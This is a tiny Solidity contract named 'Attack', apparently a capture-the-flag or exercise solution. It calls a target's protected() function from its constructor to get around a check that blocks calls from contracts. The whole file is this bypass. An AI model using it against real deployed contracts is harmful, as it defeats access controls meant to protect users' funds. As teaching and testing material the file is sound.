// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {ITarget} from "./ITarget.sol";

contract Attack {
    ITarget public target;

    constructor(address _target) {
        target = ITarget(_target);

        target.protected();
    }
}